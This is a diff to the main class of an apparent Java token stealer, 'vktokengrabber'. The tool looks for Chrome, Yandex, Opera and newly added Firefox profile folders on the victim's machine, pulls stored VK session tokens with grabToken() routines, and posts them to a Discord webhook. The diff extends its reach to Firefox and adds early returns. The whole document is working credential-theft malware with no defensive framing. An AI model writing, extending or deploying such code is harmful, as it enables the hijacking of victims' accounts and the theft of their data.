@@ -9,7 +9,7 @@ import com.github.dedinc.vktokengrabber.utils.DiscordHook;
 public class Main {
 
 	public static String hook = "ССЫЛКА НА Discord вебхук";
-	
+
 	public static void main(String[] args) {
 		String prefix = "Токенолов2020";	
 		String browser = null;
@@ -20,6 +20,7 @@ public class Main {
 		String chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome";
 		String yandex = "C:\\Users\\" + username + "\\AppData\\Local\\Yandex\\YandexBrowser";
 		String opera = "C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software";
+		String firefox = "C:\\Users\\" + username + "\\AppData\\Roaming\\Mozilla\\Firefox";
 		try {
 			DiscordHook.sendMessage(prefix, "[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + username);		
 		   } catch (Exception e) {
@@ -28,6 +29,7 @@ public class Main {
 			if (new File(chrome).exists()) {
 				try {
 					DiscordHook.sendMessage(prefix + "[Chrome]", Chrome.grabToken());
+					return;
 				   } catch (Exception e) {
 				}
 			}
@@ -36,6 +38,7 @@ public class Main {
 			if (new File(yandex).exists()) {
 				try {
 					DiscordHook.sendMessage(prefix + "[Yandex]", Yandex.grabToken());
+					return;
 				} catch (Exception e) {
 				 }
 		    }
@@ -44,6 +47,16 @@ public class Main {
 			if (new File(opera).exists()) {
 				try {
 					DiscordHook.sendMessage(prefix + "[Opera]", Opera.grabToken());
+					return;
+				} catch (Exception e) {
+				}
+			 }
+		 }
+		if (browser == null || browser.equalsIgnoreCase("firefox")) {
+			if (new File(firefox).exists()) {
+				try {
+					DiscordHook.sendMessage(prefix + "[Firefox]", Firefox.grabToken());
+					return;
 				} catch (Exception e) {
 				}
 			 }
